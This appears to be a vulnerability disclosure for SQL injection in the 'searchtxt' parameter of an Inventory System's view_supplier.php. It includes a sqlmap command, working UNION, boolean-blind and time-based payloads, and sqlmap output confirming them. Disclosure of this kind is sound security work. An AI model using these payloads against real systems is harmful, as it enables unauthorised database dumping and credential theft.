# SQL Injection in Inventory System (View Supplier)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Supplier View (`view_supplier.php`)
* **Vulnerable Parameter**: `searchtxt` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `view_supplier.php` file.

The application fails to properly sanitize the `searchtxt` parameter in the HTTP POST request (triggered by the search functionality on the supplier list page). This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries**, attackers can directly retrieve and display sensitive data from the database on the webpage, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Use the search bar to submit malicious SQL payloads, or capture the request and use a tool like `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/view_supplier.php" \
--data "searchtxt=test&Search=Search" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
searchtxt=test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a626a71,0x64754767466c5375764d596b4c6658544d664d46424275444870696543524a5344556150484d7262,0x717a716271)#&Search=Search

```

**Boolean-based Blind Payload:**

```sql
searchtxt=-7477' OR 8219=8219#&Search=Search

```

**Time-based Blind Payload:**

```sql
searchtxt=test' AND (SELECT 3185 FROM (SELECT(SLEEP(5)))SHCo)-- HVuL&Search=Search

```

## Proof of Concept

The following output from `sqlmap` confirms that the `searchtxt` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: searchtxt (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchtxt=-7477' OR 8219=8219#&Search=Search
    Vector: OR [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchtxt=test' AND (SELECT 3185 FROM (SELECT(SLEEP(5)))SHCo)-- HVuL&Search=Search
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: searchtxt=test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a626a71,0x64754767466c5375764d596b4c6658544d664d46424275444870696543524a5344556150484d7262,0x717a716271)#&Search=Search
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY]#
---
[INFO] the back-end DBMS is MySQL

```

<img width="1030" height="385" alt="图片" src="https://github.com/user-attachments/assets/a41a61a5-49ae-4bdf-8138-0c2bc36678a9" />
<img width="1206" height="575" alt="图片" src="https://github.com/user-attachments/assets/a7644acc-d660-48df-b85c-1a304f9c4d0d" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display the entire database content (suppliers, transaction details, credentials) via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html

```
